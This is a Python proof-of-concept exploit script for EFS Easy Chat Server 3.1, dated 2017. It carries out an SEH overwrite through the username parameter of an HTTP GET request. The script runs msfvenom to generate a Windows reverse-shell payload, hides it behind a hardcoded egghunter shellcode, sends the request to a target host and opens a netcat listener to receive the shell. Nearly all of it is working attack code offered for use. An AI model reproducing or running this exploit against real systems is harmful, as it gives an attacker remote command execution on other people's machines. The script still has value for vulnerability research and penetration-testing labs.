#!/usr/bin/python
# ====================================================================================================
# EFS Easy Chat Server 3.1 Username Variable SEH Overwrite EggHunter revshell POC by 3mrgnc3
# 04 JUN 2017
# Exploit only works if Easy Chat is installed to default location: "C:\EFS Software\Easy Chat Server"
# Dependencies: msfvenom,nc
# BadChars = "\x00\x20"
# Tested on Win Vista 32bit
# ====================================================================================================

import subprocess,socket,sys

try:
    poc    = str(sys.argv[0])
    target = str(sys.argv[1])
    port   = int(sys.argv[2])
    lhost  = str(sys.argv[3])
    lport  = str(sys.argv[4])
except IndexError:
    print(
          ("=" * 60) + "\r\n"
          "[+] EFS Easy Chat Server 3.1 SEH Overwrite Exploit\r\n"
          "[+] EggHunter RevShell POC by 3mrgnc3 - 04 JUN 17\r\n"
          "[+] A Target and Attacker ip and port are required!\r\n"
          "[+] Use: " + poc + " <rhost> <rport> <lhost> <lport>\r\n"
          "[+] e.g. " + poc + " 172.16.10.1 80 172.16.10.2 6666\r\n"
          + ("=" * 60)
         )
    sys.exit()

# =============================================
nop = "\x90"
mksh  = "msfvenom -p windows/shell_reverse_tcp"
mksh += " -b \'\\x00\\x20\'"
mksh += " -e x86/shikata_ga_nai"
mksh += " EXITFUNC=seh"
mksh += " LHOST="+lhost
mksh += " LPORT="+lport
mksh += " -f python "
mksh += " -a x86"
mksh += " -o RevPld.py"
mksh += " 2>/dev/null"
# EXPECTED
# Payload size: 351 bytes
# Final size of python file: 1684 bytes
#===============================================

try:
    print "[+] Attempting To Generate Reverse Shell Payload ..."
    vnm = subprocess.Popen(mksh.split(), stdout=subprocess.PIPE)
    vnm.wait()
    print "[+] Reverse Shell Payload Generated Successfully..."
except:    
    print "[!] ERROR: Couldn't Generate Payload "
    sys.exit(-1)

from RevPld import buf as shl

bop = nop * 185
# Prepend shellcode with egg tag 
shl = ("3mg3" * 2) + shl
# 32 byte egghunter, with egg of '3mg3'
eghtr = (
"\x66\x81\xca\xff\x0f\x42"
"\x52\x6a\x02\x58\xcd\x2e"
"\x3c\x05\x5a\x74\xef\xb8"
"\x33\x6d\x67\x33\x8b\xfa"
"\xaf\x75\xea\xaf\x75\xe7"
"\xff\xe7")
jp46 = "\xEB\xD0\x90\x90" #JMP SHORT 02A56D96
# EIP Overwrite at Offset 221
ret = "\xB8\x68\x01\x10" + nop * 12 #100168B8 [pop pop ret...]
pld = bop + eghtr + jp46 + ret

get = "GET /chat.ghp?username=" + pld + "&password=" + shl + "&room=1&sex=1 HTTP/1.1\r\nUser-Agent: 3mrgnc3\r\n\r\n"


lnr = "nc -s "+lhost+" -lp "+lport
try:
    ncl = subprocess.Popen(lnr, shell=True)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((target, port))

    print "\r[!] Sending Exploit GET Request..."
    s.send(get)
    s.close()
    print "\r[!] Listening For Incomming Connection..."
    ncl.poll()
    ncl.wait()
except:    
    print "\r[!] Shell Terminated!"
    subprocess.call("rm -rf RevPld*", shell=True)
    sys.exit()
